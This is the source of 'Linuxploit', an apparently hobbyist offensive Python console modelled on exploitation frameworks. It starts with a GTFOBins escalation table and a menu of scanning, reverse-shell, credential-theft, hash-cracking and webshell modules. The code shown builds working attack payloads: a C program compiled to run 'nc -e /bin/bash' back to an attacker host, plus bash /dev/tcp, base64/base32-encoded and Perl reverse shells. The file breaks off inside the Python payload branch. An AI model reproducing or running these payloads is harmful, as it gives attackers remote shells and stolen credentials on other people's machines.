#!/usr/bin/env python3
import os
import nmap
import readline
import socket
import base64
import requests
import random
import netifaces as nf
import platform
import time
import readline
import datetime
import crypt
import re
import passlib.hash
import hashlib
from bs4 import BeautifulSoup

gtfobins_help="""
Binary 	Functions
apt-get 	

    | Shell |  | Sudo |  

apt 	

    | Shell |  | Sudo |  

aria2c 	

    Command | SUID |  | Sudo |  

arp 	

    File read | SUID |  | Sudo |  

ash 	

    | Shell |  File write | SUID |  | Sudo |  

awk 	

    | Shell |  Non-interactive | reverse |  | Shell |  | Non-interactive bind |  | Shell |  | File write File read  | | Sudo |  Limited | SUID |  

base32 	

    File read | SUID |  | Sudo |  

base64 	

    File read | SUID |  | Sudo |  

bash 	

    | Shell |  | reverse |  | Shell |  | File upload |  | File download |  | | File write File read  | | Library load |  |  | SUID |  | Sudo |  

bpftrace 	

    | Sudo |  

bundler 	

    | Shell |  | Sudo |  

busctl 	

    | Shell |  | Sudo |  

busybox 	

    | Shell |  | File upload |  | File write File read  | | SUID |  | Sudo |  

byebug 	

    | Shell |  | Sudo |  Limited | SUID |  

cancel 	

    | File upload |  

cat 	

    File read | SUID |  | Sudo |  

chmod 	

    | SUID |  | Sudo |  

chown 	

    | SUID |  | Sudo |  

chroot 	

    | SUID |  | Sudo |  

cobc 	

    | Shell |  | Sudo |  

cp 	

    | File write File read  | | SUID |  | Sudo |  

cpan 	

    | Shell |  | reverse |  | Shell |  | File upload |  | File download |  | Sudo |  

cpulimit 	

    | Shell |  | Sudo |  

crash 	

    | Shell |  Command | Sudo |  

crontab 	

    Command | Sudo |  

csh 	

    | Shell |  File write | SUID |  | Sudo |  

curl 	

    | File upload |  | File download |  File read | SUID |  | Sudo |  

cut 	

    File read | SUID |  | Sudo |  

dash 	

    | Shell |  File write | SUID |  | Sudo |  

date 	

    File read | SUID |  | Sudo |  

dd 	

    | File write File read  | | SUID |  | Sudo |  

dialog 	

    File read | SUID |  | Sudo |  

diff 	

    File read | SUID |  | Sudo |  

dmesg 	

    | Shell |  File read | Sudo |  

dmsetup 	

    | SUID |  | Sudo |  

dnf 	

    | Sudo |  

docker 	

    | Shell |  | File write File read  | | SUID |  | Sudo |  

dpkg 	

    | Sudo |  

easy_install 	

    | Shell |  | reverse |  | Shell |  | File upload |  | File download |  | | File write File read  | | Library load |  |  | Sudo |  

eb 	

    | Shell |  | Sudo |  

ed 	

    | Shell |  | File write File read  | | Sudo |  Limited | SUID |  

emacs 	

    | Shell |  | File write File read  | | SUID |  | Sudo |  

env 	

    | Shell |  | SUID |  | Sudo |  

eqn 	

    File read | SUID |  | Sudo |  

expand 	

    File read | SUID |  | Sudo |  

expect 	

    | Shell |  | SUID |  | Sudo |  

facter 	

    | Shell |  | Sudo |  

file 	

    File read | SUID |  | Sudo |  

find 	

    | Shell |  | SUID |  | Sudo |  

finger 	

    | File upload |  | File download |  

flock 	

    | Shell |  | SUID |  | Sudo |  

fmt 	

    File read | SUID |  | Sudo |  

fold 	

    File read | SUID |  | Sudo |  

ftp 	

    | Shell |  | File upload |  | File download |  | Sudo |  

gawk 	

    | Shell |  Non-interactive | reverse |  | Shell |  | Non-interactive bind |  | Shell |  | File write File read  | | Sudo |  Limited | SUID |  

gcc 	

    | Shell |  | Sudo |  

gdb 	

    | Shell |  | reverse |  | Shell |  | File upload |  | File download |  | | File write File read  | | Library load |  |  | SUID |  | Sudo |  Capabilities 

gem 	

    | Shell |  | Sudo |  

genisoimage 	

    File read | Sudo |  

gimp 	

    | Shell |  | reverse |  | Shell |  | File upload |  | File download |  | | File write File read  | | Library load |  |  | SUID |  | Sudo |  

git 	

    | Shell |  | Sudo |  Limited | SUID |  

grep 	

    File read | SUID |  | Sudo |  

gtester 	

    | Shell |  | SUID |  | Sudo |  

hd 	

    File read | SUID |  | Sudo |  

head 	

    File read | SUID |  | Sudo |  

hexdump 	

    File read | SUID |  | Sudo |  

highlight 	

    File read | SUID |  | Sudo |  

iconv 	

    | File write File read  | | SUID |  | Sudo |  

iftop 	

    | Shell |  | Sudo |  Limited | SUID |  

ionice 	

    | Shell |  | SUID |  | Sudo |  

ip 	

    File read | SUID |  | Sudo |  

irb 	

    | Shell |  | reverse |  | Shell |  | File upload |  | File download |  | | File write File read  | | Library load |  |  | Sudo |  

jjs 	

    | Shell |  | reverse |  | Shell |  | File download |  | File write File read  | | SUID |  | Sudo |  

journalctl 	

    | Shell |  | Sudo |  

jq 	

    File read | SUID |  | Sudo |  

jrunscript 	

    | Shell |  | reverse |  | Shell |  | File download |  | File write File read  | | SUID |  | Sudo |  

ksh 	

    | Shell |  | reverse |  | Shell |  | File upload |  | File download |  | File write File read  | | SUID |  | Sudo |  

ks| Shell |  	

    File read | SUID |  | Sudo |  

ld.so 	

    | Shell |  | SUID |  | Sudo |  

ldconfig 	

    | Sudo |  Limited | SUID |  

less 	

    | Shell |  | File write File read  | | SUID |  | Sudo |  

logsave 	

    | Shell |  | SUID |  | Sudo |  

look 	

    File read | SUID |  | Sudo |  

ltrace 	

    | Shell |  | Sudo |  

lua 	

    | Shell |  Non-interactive | reverse |  | Shell |  | Non-interactive bind |  | Shell |  | File upload |  | File download |  | File write File read  | | Sudo |  Limited | SUID |  

lwp-download 	

    | File download |  | SUID |  | Sudo |  

lwp-request 	

    File read | SUID |  | Sudo |  

mail 	

    | Shell |  | Sudo |  

make 	

    | Shell |  File write | SUID |  | Sudo |  

man 	

    | Shell |  File read | Sudo |  

mawk 	

    | Shell |  | File write File read  | | Sudo |  Limited | SUID |  

more 	

    | Shell |  File read | SUID |  | Sudo |  

mount 	

    | Sudo |  

mtr 	

    File read | Sudo |  

mv 	

    | SUID |  | Sudo |  

mysql 	

    | Shell |  | Library load |  | Sudo |  Limited | SUID |  

nano 	

    | Shell |  | File write File read  | | SUID |  | Sudo |  

nawk 	

    | Shell |  Non-interactive | reverse |  | Shell |  | Non-interactive bind |  | Shell |  | File write File read  | | Sudo |  Limited | SUID |  

nc 	

    | reverse |  | Shell |  Bind | Shell |  | File upload |  | File download |  | Sudo |  Limited | SUID |  

nice 	

    | Shell |  | SUID |  | Sudo |  

nl 	

    File read | SUID |  | Sudo |  

nmap 	

    | Shell |  Non-interactive | reverse |  | Shell |  | Non-interactive bind |  | Shell |  | File upload |  | File download |  | File write File read  | | Sudo |  Limited | SUID |  

node 	

    | Shell |  | reverse |  | Shell |  Bind | Shell |  | SUID |  | Sudo |  Capabilities 

nohup 	

    | Shell |  Command | SUID |  | Sudo |  

nroff 	

    | Shell |  | Sudo |  

nsenter 	

    | Shell |  | Sudo |  

od 	

    File read | SUID |  | Sudo |  

openssl 	

    | reverse |  | Shell |  | File upload |  | File download |  | | File write File read  | | Library load |  |  | SUID |  | Sudo |  

pdb 	

    | Shell |  | Sudo |  

perl 	

    | Shell |  | reverse |  | Shell |  | SUID |  | Sudo |  Capabilities 

pg 	

    | Shell |  File read | SUID |  | Sudo |  

php 	

    | Shell |  Command | reverse |  | Shell |  | File upload |  | File download |  | SUID |  | Sudo |  Capabilities 

pic 	

    | Shell |  | Sudo |  Limited | SUID |  

pico 	

    | Shell |  | File write File read  | | SUID |  | Sudo |  

pip 	

    | Shell |  | reverse |  | Shell |  | File upload |  | File download |  | | File write File read  | | Library load |  |  | Sudo |  

pry 	

    | Shell |  | Sudo |  Limited | SUID |  

puppet 	

    | Shell |  | File write File read  | | Sudo |  

python 	

    | Shell |  | reverse |  | Shell |  | File upload |  | File download |  | | File write File read  | | Library load |  |  | SUID |  | Sudo |  Capabilities 

rake 	

    | Shell |  | Sudo |  Limited | SUID |  

readelf 	

    File read | SUID |  | Sudo |  

red 	

    | File write File read  | | Sudo |  

redcarpet 	

    File read | Sudo |  

restic 	

    | File upload |  | SUID |  | Sudo |  

rlogin 	

    | File upload |  

rlwrap 	

    | Shell |  File write | SUID |  | Sudo |  

rpm 	

    | Shell |  | SUID |  | Sudo |  

rpmquery 	

    | Shell |  | SUID |  | Sudo |  

rsync 	

    | Shell |  | SUID |  | Sudo |  

ruby 	

    | Shell |  | reverse |  | Shell |  | File upload |  | File download |  | | File write File read  | | Library load |  |  | Sudo |  Capabilities 

run-mailcap 	

    | Shell |  | File write File read  | | Sudo |  

run-parts 	

    | Shell |  | SUID |  | Sudo |  

rvim 	

    | Shell |  | reverse |  | Shell |  Non-interactive | reverse |  | Shell |  | Non-interactive bind |  | Shell |  | File upload |  | File download |  | | File write File read  | | Library load |  |  | SUID |  | Sudo |  Capabilities Limited | SUID |  

scp 	

    | Shell |  | File upload |  | File download |  | Sudo |  Limited | SUID |  

screen 	

    | Shell |  File write | Sudo |  

script 	

    | Shell |  File write | Sudo |  

sed 	

    | Shell |  Command | File write File read  | | SUID |  | Sudo |  

service 	

    | Shell |  | Sudo |  

setarch 	

    | Shell |  | SUID |  | Sudo |  

sftp 	

    | Shell |  | File upload |  | File download |  | Sudo |  

shuf 	

    | File write File read  | | SUID |  | Sudo |  

smbclient 	

    | Shell |  | File upload |  | File download |  | Sudo |  

socat 	

    | reverse |  | Shell |  Bind | Shell |  | Sudo |  Limited | SUID |  

soelim 	

    File read | SUID |  | Sudo |  

sort 	

    File read | SUID |  | Sudo |  

sqlite3 	

    | Shell |  | File write File read  | | Sudo |  Limited | SUID |  

ssh 	

    | Shell |  | File upload |  | File download |  File read | Sudo |  

start-stop-daemon 	

    | Shell |  | SUID |  | Sudo |  

stdbuf 	

    | Shell |  | SUID |  | Sudo |  

strace 	

    | Shell |  | SUID |  | Sudo |  

strings 	

    File read | SUID |  | Sudo |  

systemctl 	

    | SUID |  | Sudo |  

tac 	

    File read | SUID |  | Sudo |  

tail 	

    File read | SUID |  | Sudo |  

tar 	

    | Shell |  | File upload |  | File download |  | File write File read  | | Sudo |  Limited | SUID |  

taskset 	

    | Shell |  | SUID |  | Sudo |  

tclsh 	

    | Shell |  Non-interactive | reverse |  | Shell |  | SUID |  | Sudo |  

tcpdump 	

    Command | Sudo |  

tee 	

    File write | SUID |  | Sudo |  

telnet 	

    | Shell |  | reverse |  | Shell |  | Sudo |  Limited | SUID |  

tftp 	

    | File upload |  | File download |  | SUID |  | Sudo |  

time 	

    | Shell |  | SUID |  | Sudo |  

timeout 	

    | Shell |  | SUID |  | Sudo |  

tmux 	

    | Shell |  | Sudo |  

top 	

    | Shell |  | Sudo |  

ul 	

    File read | SUID |  | Sudo |  

unexpand 	

    File read | SUID |  | Sudo |  

uniq 	

    File read | SUID |  | Sudo |  

unshare 	

    | Shell |  | SUID |  | Sudo |  

uudecode 	

    File read | SUID |  | Sudo |  

uuencode 	

    File read | SUID |  | Sudo |  

valgrind 	

    | Shell |  | Sudo |  

vi 	

    | Shell |  | File write File read  | | Sudo |  

vim 	

    | Shell |  | reverse |  | Shell |  Non-interactive | reverse |  | Shell |  | Non-interactive bind |  | Shell |  | File upload |  | File download |  | | File write File read  | | Library load |  |  | SUID |  | Sudo |  Capabilities Limited | SUID |  

watch 	

    | Shell |  | SUID |  | Sudo |  Limited | SUID |  

wget 	

    | File upload |  | File download |  | SUID |  | Sudo |  

whois 	

    | File upload |  | File download |  

wish 	

    | Shell |  Non-interactive | reverse |  | Shell |  | Sudo |  

xargs 	

    | Shell |  File read | SUID |  | Sudo |  

xxd 	

    | File write File read  | | SUID |  | Sudo |  

yelp 	

    File read 

yum 	

    | Sudo |  

zip 	

    | Shell |  | Sudo |  Limited | SUID |  

zsh 	

    | Shell |  | SUID |  | Sudo |  

zsoelim 	

    File read | SUID |  | Sudo |  

zypper 	

    | Shell |  | Sudo |  

USE gtfobins FOLLOWED BY THE BINARY NAME
Example:
gtfobins vim

"""
banner1="""\033[1;32m
 _ _                        _       _ _   
| (_)_ __  _   ___  ___ __ | | ___ (_) |_ 
| | | '_ \| | | \ \/ / '_ \| |/ _ \| | __|
| | | | | | |_| |>  <| |_) | | (_) | | |_ 
|_|_|_| |_|\__,_/_/\_\ .__/|_|\___/|_|\__|
                     |_|                  
                                         ---> Coded by FEBIN
"""
banner2="""\033[1;33m
╦  ╦╔╗╔╦ ╦═╗ ╦╔═╗╦  ╔═╗╦╔╦╗
║  ║║║║║ ║╔╩╦╝╠═╝║  ║ ║║ ║ 
╩═╝╩╝╚╝╚═╝╩ ╚═╩  ╩═╝╚═╝╩ ╩ 
                         ----> coded by FEBIN
	"""
banner3="""\033[1;34m
 

          ╓╥▄▄▄▓▓▓▓▓▓▄▄w

 ▄█████▓█████▀▀▀▀▀▀▀▀▀████▄w

 ╫██▓███▓▓╫╫╫╫▓▓▓▓▓╬╬╫╫╫╫▀███▄

  ▀███▓████▓▓█▓▓▓▓▓▓▓▓█▓▓▓╫╫███▄

   ║█████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓▒╫██▌

   █████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▓╫███

  :████▓▓▓▓╫╫▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╫██▌

  :████▓▓▓╫╫╫╫▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▒╫██▌        ,╓▄▄▄▄╓,

   ████▓▓▓▓╫╫▓▓▓▓▓▓▓▓▓╫╫▓▓▓▓▓▓█▓╬██▌╓╓╓▄▄▓████████████▓▄▄,╓,

   ╫████▓▓▓▓▓▓▓▓▓▓▓▓╫╫╫╫╫╫╫▓▓▓▓▓███████████████▓▓▓▓▓██████████▓,

   "████▓▓▓▓▓▓▓██▓▓▓╫╫╫╫╫╫╫╫╫╫▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▓╬╫╫▀██▄

    ║███▓▓▓▓▓▓███▓▓▓╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫▓▓▓▓╫▓▓▓╫╫▓╫╫▓▓▓▓▓▓▓▓█▓╫╫╫██m

    `███▓▓▓▓▓████▓▓▓▓╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫▓╫╫╫╫╫╫▓╫▓▓▓▓▓▓▓█╫╫╫██▌

     ╣██▓▓▓▓█████▓▓▓▓╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫▓▓▓╫▓▓╫▓▓▓▓╫╫▓▓▓█▓╫╫██▌

     ╙██████████▓▓▓▓▓╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫▓▓▓▓▓▓▓▓▓▓▓▓▓╫╫╫╫▓▓▓╫╫╫██M

      `╙▀▀███████▓▓▓▓▓╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫╫▓▓▓▓▓▓▓▓▓▓▓▓▓▓╫╫╫╫▓▓▓▌╫╫██▌

          ,╔█████▓▓▓▓▓╫╫╫╫╫╫╫╫╫╫╫╫▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╫╫╫▓▓▓╫╫██▀

       ╓▄▓████▓▓▓▓▓▓▓▓▓╫╫╫╫╫╫╫╫╫╫╫▓▓▓▓▓▓▓▓▓▓██████▓▓▓▓▓▓▓▓▓▓███▓⌂..

    ╓▄████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╫╫╫╫╫╫╫▓▓▓▓▓▓██████████▓████▓▓▓▓▓██████▌╦╦╦╦╦╦╦╦╦µµ»

    ███▓▓▓▓▓▓▓████████▓▓▓▓╫╫╫╫╫▓▓▓▓████████████▓▓███╫╫▀▓█████████╫╫╫╫╫╫╫╫╫╫░░»

   ╚███▓▓▓▓▓██████████████▓▓╫╫▓▓▓████████▀╫████████▄▄▓██████████▌╫╫╫╫╫╫╫╫╩░░`

    █████▓▓▓▓██████▓▓▓█████▓▓▓▓▓▓██▌╫╫╫╫╫╫████████████▀╫╫███████▌╫╫╫╫Ñ░░"``

     `╙▀████████████▓╠▓█████▓▓▓▓▓██▌╫╫╫╫▓████████▌░░╩╩╫╫╫████████╫╫╫Ü░`

          `╙▀███████████▀╟███▓▓▓▓███▒╩╠▓████████▌``»»░"╔█████████░░░"`

              ``╙╙╙╙╙╙»»░╙███▓▓▓▓▓██▌»▓██▓▓████▀ ```` ╔█████████Ñ»``

                          ╙███▓▓▓▓██M║██▌╫╫▓███H      ╙███▄▓▓███`

                           ╙███▓▓▓██▌╙███████▀"        "▀▀███▀╙

                           :███▓▓▓███⌐ ````

                           ╔███▓▓▓███

                          ║█████▓███H

                         ╔███╫▀╫▓███`

                         "███▓▓████M

                           "▀▀▀▀╙"

                        LINUXPLOIT
                                         -----> coded by FEBIN
	"""
banner4="""\033[1;35m
██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
██║     ██║████╗  ██║██║   ██║╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                                  --------> Coded by FEBIN                                                                           
	"""
banner5="""\033[1;31m
  ██▓     ██▓ ███▄    █  █    ██ ▒██   ██▒ ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓
▓██▒    ▓██▒ ██ ▀█   █  ██  ▓██▒▒▒ █ █ ▒░▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒
▒██░    ▒██▒▓██  ▀█ ██▒▓██  ▒██░░░  █   ░▓██░ ██▓▒▒██░    ▒██░  ██▒▒██▒▒ ▓██░ ▒░
▒██░    ░██░▓██▒  ▐▌██▒▓▓█  ░██░ ░ █ █ ▒ ▒██▄█▓▒ ▒▒██░    ▒██   ██░░██░░ ▓██▓ ░ 
░██████▒░██░▒██░   ▓██░▒▒█████▓ ▒██▒ ▒██▒▒██▒ ░  ░░██████▒░ ████▓▒░░██░  ▒██▒ ░ 
░ ▒░▓  ░░▓  ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒▒ ░ ░▓ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▓    ▒ ░░   
░ ░ ▒  ░ ▒ ░░ ░░   ░ ▒░░░▒░ ░ ░ ░░   ░▒ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ▒ ░    ░    
  ░ ░    ▒ ░   ░   ░ ░  ░░░ ░ ░  ░    ░  ░░         ░ ░   ░ ░ ░ ▒   ▒ ░  ░      
    ░  ░ ░           ░    ░      ░    ░               ░  ░    ░ ░   ░           
    
                                                                -----> Coded by FEBIN                                                                            
	"""
banner6="""
[?25l[?7l[38;5;8m[1m        #####
[38;5;8m[1m       #######
[38;5;8m[1m       ##[37m[0m[1mO[38;5;8m[1m#[37m[0m[1mO[38;5;8m[1m##
[38;5;8m[1m       #[0m[33m[1m#####[38;5;8m[1m#
[38;5;8m[1m     ##[37m[0m[1m##[0m[33m[1m###[37m[0m[1m##[38;5;8m[1m##
[38;5;8m[1m    #[37m[0m[1m##########[38;5;8m[1m##
[38;5;8m[1m   #[37m[0m[1m############[38;5;8m[1m##
[38;5;8m[1m   #[37m[0m[1m############[38;5;8m[1m###
[0m[33m[1m  ##[38;5;8m[1m#[37m[0m[1m###########[38;5;8m[1m##[0m[33m[1m#
[0m[33m[1m######[38;5;8m[1m#[37m[0m[1m#######[38;5;8m[1m#[0m[33m[1m######
[0m[33m[1m#######[38;5;8m[1m#[37m[0m[1m#####[38;5;8m[1m#[0m[33m[1m#######
[0m[33m[1m  #####[38;5;8m[1m#######[0m[33m[1m#####[0m
[12A[9999999D













[?25h[?7h
  LINUXPLOIT
                               ------> Coded by FEBIN
"""
banners=[banner1,banner2,banner3,banner4,banner5,banner6]
random.shuffle(banners)
print(banners[0])
def linuxploit():
	modules="""\033[1;33m
Available commands:

help                                           ----------> shows help message
use <module name | module s.no>                ----------> to use the module
banner                                         ----------> to change banner of linuxploit
bannerq / clear                                ----------> to clear the console
os:<command>                                   ----------> to execute an os command
exec:<command>                                 ----------> to execute an os command
exec <command>                                 ----------> to execute an os command
os <command>                                   ----------> to execute an os command
quit / exit                                    ----------> to exit from the console
whoami / current_user                          ----------> returns Current user
sysinfo / systeminfo /machine_info             ----------> returns Info about the Local Machine

Available modules...

[*] Auxiliary:
---------------------------------------------------------------------------------------------------------
S.no:                |       Auxiliary module               |         Description
---------------------------------------------------------------------------------------------------------
0)                    auxiliary-enum_ssh_info                  Enumerates Information about SSH 
1)                    auxiliary-port_scan                      Scans all the ports and detects the service
2)                    auxiliary-http_banner_grab               grabs HTTP server banner  


[*] Payloads:
----------------------------------------------------------------------------------------------------------
S.no:  | payload module                |             Description
----------------------------------------------------------------------------------------------------------
3)     payload-binary_shell_reverse_tcp    linux reverse tcp shell binary
4)     payload-bash_reverse_tcp            Bash reverse tcp shell payload
5)     payload-perl_reverse_tcp            perl reverse tcp shell payload
6)     payload-python_reverse_tcp          php reverse tcp shell payload
7)     payload-php_reverse_tcp             python reverse tcp shell payload
8)     payload-ruby_reverse_tcp            ruby reverse tcp shell payload
9)     payload-socat_reverse_tcp           socat reverse tcp shell payload
10)    payload-netcat_reverse_tcp          netcat reverse tcp shell payload
11)    payload-lua_reverse_tcp             lua reverse tcp shell payload
12)    payload-curl_reverse_tcp            spawns a Reverse tcp shell using curl
13)    payload-telnet_reverse_tcp          spawns a reserse tcp shell using telnet
----------------------------------------------------------------------------------------------------------

Handler:
----------------------------------------------------------------------------------------------------------
S.no:    |    Handler                     |               Description
----------------------------------------------------------------------------------------------------------

99)       tcp_handler                          Handles all the reverse connections

----------------------------------------------------------------------------------------------------------





[*] Post Exploitation, Privilege Escalation & Enumeration :
----------------------------------------------------------------------------------------------------------
S.no:     |         Post module               |          Description
----------------------------------------------------------------------------------------------------------

14)         post/LinEnum                             Enumerates the informations about local machine
15)         post/linpeas                             Enumerates the informations of local machine
16)         post/pspy                                Enumerates the live background processes in the local machine without root privileges
17)         post/unix-privesc-check                  Unix/Linux privilege escalation checker
18)         post/linux-exploit-suggester             Linux local exploit suggester
19)         post/logrotten                           Exploits logrotate process
20)         post/spawn_shell                         Gives commands to spawn stable tty command-shell
21)         post/nc_portfwd_pivot                    netcat portforwarding for pivoting
22)         post/ssh_local_portfwd                   ssh local portforward for pivoting
23)         post/ssh_remote_portfwd                  ssh remote portforward for pivoting 
24)         post/mimipenguin                         extracts Clear text Password of current user from memory(root)
25)         post/gather_wifi_creds                   gets wireless credentials saved in the local machine(root)
26)         post/linuxprivchecker                    python script to check privesc vulnerabilities
27)         post/crack_shadow_hash                   cracks hashes which are retrieved from /etc/shadow
28)         post/crack_grub2_pbkdf2                  cracks hashes generated by GRUB2(grub-mkpasswd-pbkdf2)


[*] PHP WEB-SHELLS:
----------------------------------------------------------------------------------------------------------
S.no:     |         Post module               |          Description
----------------------------------------------------------------------------------------------------------

29)         php_webshell                             Simple php webshell
30)         php_webshell_gui                         A simple interactive webshell
31)         webshell_handler                         Handler for simple php webshell which connects and executes commands


[*] GTFOBINS:

Available Commands:

help gtfobins                     To see the list of gtfobins binaries 
gtfobins <binary name>             To see the binary and its usage/methods from gtfobins
	 """

	try:
		print("\033[1;39m")
		mod=input("\nFRLf> ")
		modinput=mod.lower().strip()
		if modinput=="help":
			print(modules)
			print("Enter any options to use")
		elif modinput=="0" or modinput=="use 0" or modinput=="use auxiliary-enum_ssh_info" or modinput=="auxiliary-enum_ssh_info":
			s=nmap.PortScanner()
			aux0=input("FRLf(auxiliary-enum_ssh_info Enter RHOST)> ").lower().strip()
			ip=""
			if len(aux0) >= 8 and aux0[0].isdigit():
				rhost=aux0
				ip=rhost
			elif aux0.islower():
				try:
					rhost=socket.gethostbyname(aux0)
					ip=rhost
				except socket.gaierror:
					print("Can't get the address of RHOST.....")
			else:
				print("Invalid RHOST....")
				ip=input("Enter a proper RHOST : ")
			portnum=22
			rport=input("FRLf(auxiliary-enum_ssh_info Enter RPORT[Default 22])> ")
			if rport.isdigit() and int(rport) > 0 and int(rport) <= 65535:
				portnum=int(rport)
				scanned=s.scan(ip,str(portnum))
				if s[ip]['tcp'][portnum].get('state') == 'open':
						print("")
						print("\033[1;36m[!] "+str(portnum) + " is open in "+ ip+" [*] Service : " + s[ip]['tcp'][portnum].get('product')+"  [*] SSH version: " + s[ip]['tcp'][portnum].get('version')+" [*] platform : " + s[ip]['tcp'][portnum].get('cpe'))
						print("Extra informations : " + s[ip]['tcp'][portnum].get('extrainfo'))
						print("")
				else:
					print(f"\033[1;33mThe RPORT {portnum} is closed in {rhost}...!")
			elif rport=="":
				portnum=22
				scanned=s.scan(ip,str(portnum))
				print("")
				if s[ip]['tcp'][portnum].get('state') == 'open':
						print("\033[1;34m[!] "+str(portnum) + " is open in "+ ip+" [*] Service : " + s[ip]['tcp'][portnum].get('product')+"  [*] SSH version: " + s[ip]['tcp'][portnum].get('version')+" [*] platform : " + s[ip]['tcp'][portnum].get('cpe'))
						print("Extra informations : " + s[ip]['tcp'][portnum].get('extrainfo'))
						print("")
				else:
					print(f"\033[1;33mThe RPORT {portnum} is closed in {rhost}...!")
			else:
				print("\033[1;31mInvalid RPORT")
		elif modinput=="1" or modinput=="use 1" or modinput=="use auxiliary-port_scan" or modinput=="auxiliary-port_scan":
			aux1 = input("FRLf(auxiliary-port_scan Enter RHOST)> ").lower().strip()
			ip=""
			if len(aux1) >= 8 and aux1[0].isdigit():
				rhost=aux1
				ip=rhost
				print("\nScanning "+ip+"  ..........\n")
			elif aux1.islower():
				try:
					rhost=socket.gethostbyname(aux1)
					ip=rhost
					print("\nScanning "+ip+" .......\n")
				except socket.gaierror:
					print("Can't get the address of RHOST.....")
			try:	
					s=nmap.PortScanner()
					for portnum in range(65536):
						scanned=s.scan(ip,str(portnum))
						if s[ip]['tcp'][portnum].get('state') == 'open':
							print("\033[1;32m[!] "+str(portnum) + " is open in "+ ip+" [*] Service : " + s[ip]['tcp'][portnum].get('product')+"  [*] Service version: " + s[ip]['tcp'][portnum].get('version')+" [*] platform : " + s[ip]['tcp'][portnum].get('cpe'))
							print("Extra informations : " + s[ip]['tcp'][portnum].get('extrainfo'))
							print("")
						else:
							pass
			except KeyboardInterrupt:
					print("\033[1;33mExited..........")
			else:
				pass
				
		elif modinput=="2" or modinput=="use 2" or modinput=="use auxiliary-http_banner_grab" or modinput=="auxiliary-http_banner_grab":
			url=input("FRLf(auxiliary-http_banner_grab  Enter the URL)> ")
			try:
				banner=requests.get(url).headers.get("Server")
				print(f"\n\033[1;33mServer banner : {banner} \n")
	
			except requests.exceptions.ConnectionError:
				print("\033[1;31mConnection to the Server Failed, May be invalid URL or bad Internet connection. Check Your Internet connection,URL and try again\n ")
			except requests.exceptions.ReadTimeout:
				print("\033[1;31mError : EXECUTION STOPPED DUE TO !TIMED OUT! ERROR, YOUR INTERNET MAY BE DISCONNECTED!!!....EXITTED")
		elif modinput=="3" or modinput=="use 3" or modinput=="use payload-binary_shell_reverse_tcp" or modinput=="payload-binary_shell_reverse_tcp":
			lhost=input("FRLf(payload-binary_shell_reverse_tcp   Enter the LHOST)> ")
			lport=input("FRLf(payload-binary_shell_reverse_tcp   Enter the LPORT)> ")
			if lport.isdigit():
				name=input("FRLf(payload-binary_shell_reverse_tcp   Enter the Name to save)> ").strip()
				binary=open(f"{name}.c","w+")
				binary.write("""#include <stdio.h>
#include <stdlib.h>
int main(){				
system("nc -e /bin/bash %s %s & disown && clear");				
}
				 """ %(lhost,lport))
				binary.close()
				os.system(f"gcc {name}.c -o binaries/{name} > /dev/null")
				print(f"\033[1;33mpayload saved to {os.getcwd()}/binaries/{name}")
				os.remove(f"{name}.c")

		elif modinput=="4" or modinput=="use 4" or modinput=="use payload-bash_reverse_tcp" or modinput=="payload-bash_reverse_tcp":
			lhost=input("FRLf(payload-bash_reverse_tcp   Enter the LHOST)> ")
			lport=input("FRLf(payload-bash_reverse_tcp   Enter the LPORT)> ")
			b64=base64.b64encode(f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1".encode("utf-8"))
			b32=base64.b32encode(f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1".encode("utf-8"))			
			print("\nPayload: \n")
			print(f"\033[1;34mbash -i >& /dev/tcp/{lhost}/{lport} 0>&1 \n")
			print(f"\033[1;34msetsid bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 \n")
			print(f"\033[1;33mBASE64 Encoded : \033[1;34mbase64 -d <<< {b64.decode('utf-8')} | bash \n")
			print(f"\033[1;33mBASE32 Encoded : \033[1;34mbase32 -d <<< {b32.decode('utf-8')} | bash \n")
		elif modinput=="5" or modinput=="use 5" or modinput=="use payload-perl_reverse_tcp" or modinput=="payload-perl_reverse_tcp":
			lhost=input("FRLf(payload-perl_reverse_tcp   Enter the LHOST)> ")
			lport=input("FRLf(payload-perl_reverse_tcp   Enter the LPORT)> ")
			print("\nPayload: \n")
			print("""\033[1;34m
perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'


 """ %(lhost,lport) )
		elif modinput=="6" or modinput=="use 6" or modinput=="use payload-python_reverse_tcp" or modinput=="payload-python_reverse_tcp":
			lhost=input("FRLf(payload-python_reverse_tcp   Enter the LHOST)> ")
			lport=input("FRLf(payload-python_reverse_tcp   Enter the LPORT)> ")
			print("\nPayload: \n")
